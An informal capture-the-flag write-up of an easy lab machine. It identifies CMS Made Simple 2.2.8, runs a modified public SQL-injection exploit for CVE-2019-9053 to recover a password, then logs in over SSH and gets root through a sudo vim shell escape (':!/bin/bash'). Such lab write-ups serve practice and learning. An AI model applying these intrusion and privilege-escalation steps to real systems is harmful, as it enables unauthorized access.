They say its easy

`robots.txt` is written by 'mike'

fuzzing show a simple page with 301 code...we visited and got a simple page made with cms made simple (CMSMS)

`This site is powered by CMS Made Simple version 2.2.8`

okay then...of of the pages say

```
To get to the Administration Console you have to login as the administrator (with the username/password you mentioned during the installation process) on your site at http://yourwebsite.com/cmsmspath/admin. If this is your site click here to login.
```

lets google

Actually...found alot of cve that matches this version...but time-based sqli `CVE-2019-9053` was or best match

There is an exploit from exploitdb provided...a python script we are gonna use

Took me a bit to fix the script and make it work with python3 (I could just use python2 though)

I had to :

- change shebang line on top to 'python3' instead of 'python'
- add parenthesis to the print statements
- fix an error with md5 (added encode UTF-8 before the hexdigest) in crack_password function
- made sure to point -u argument to the simple cms path...like http://ip_address/simple
- and the most frustrating the TIME variable! due to my stupid slow internet I had to increase the variable to 20 to have results and it obviously took me waaaay longer

Anyway I got results

[+] Password cracked: secret
```

we ssh as mitch (remember the port is unusual -p 2222)

And we get right into business!
`$ cat user.txt`

## Priilege Escalation

```
$ sudo -l
User mitch may run the following commands on Machine:
(root) NOPASSWD: /usr/bin/vim
```

OH NO NOT VIM...hey but wait..we can run commands in vim

then its easy peazy

`sudo vim`

Then in vim we do:

```
:!/bin/bash
```

Ã€nd its over

```
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Fastest privEsc in the west

```
root@Machine:/root# cat root.txt
```

its indeed an easy ctf...but its always fun to do

glhf!
